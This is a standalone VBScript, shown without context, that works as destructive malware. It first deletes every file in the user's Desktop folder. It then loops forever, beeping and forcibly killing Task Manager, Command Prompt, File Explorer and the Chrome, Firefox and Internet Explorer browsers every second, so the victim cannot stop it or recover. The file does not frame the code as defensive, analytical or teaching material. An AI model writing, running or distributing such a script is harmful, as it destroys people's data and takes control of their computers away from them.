Option Explicit

Dim objFSO, objFolder, objFile, objShell

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the Desktop folder
Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))

' Loop through each file in the Desktop folder and delete it
For Each objFile In objFolder.Files
    objFSO.DeleteFile(objFile)
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objFolder = Nothing
Set objFSO = Nothing

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Run an infinite loop
Do While True
    ' Play a beep sound
    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True

    ' Terminate Task Manager
    objShell.Run "taskkill /f /im taskmgr.exe", 0, True

    ' Terminate Command Prompt
    objShell.Run "taskkill /f /im cmd.exe", 0, True

    ' Terminate File Explorer
    objShell.Run "taskkill /f /im explorer.exe", 0, True

    ' Terminate common browsers
    objShell.Run "taskkill /f /im chrome.exe", 0, True
    objShell.Run "taskkill /f /im firefox.exe", 0, True
    objShell.Run "taskkill /f /im iexplore.exe", 0, True

    ' Wait for one second before repeating the loop
    WScript.Sleep 1000
Loop
